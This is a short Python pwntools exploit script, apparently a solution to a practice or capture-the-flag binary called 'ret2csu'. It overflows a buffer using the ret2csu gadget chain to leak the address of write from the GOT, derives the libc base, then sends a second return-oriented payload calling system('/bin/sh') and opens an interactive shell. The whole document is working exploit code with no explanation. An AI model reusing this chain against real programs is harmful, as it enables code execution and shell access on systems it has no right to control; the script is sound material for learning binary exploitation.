from pwn import *
context.arch = "amd64"
context.log_level = "debug"

vul = 0x400566
def csu(offset,end,front,fun_got,arg1,arg2,arg3):
    tmp = flat(["A"*offset,end,0,1,fun_got,arg3,arg2,arg1,front,"A"*0x38,vul])
    return tmp

e = ELF("./ret2csu")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

end = 0x40061a
front = 0x400600
write_got = e.got["write"]

payload = csu(24,end,front,write_got,1,write_got,8)

p = process("./ret2csu")

pause()
p.sendlineafter("hello",payload)
write = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc.address = write - libc.symbols["write"]
sys = libc.symbols["system"]
bin_sh = libc.search("/bin/sh").next()

rdi = 0x400623
payload2 = flat(["A"*24,rdi,bin_sh,sys])
p.sendline(payload2)

p.interactive()
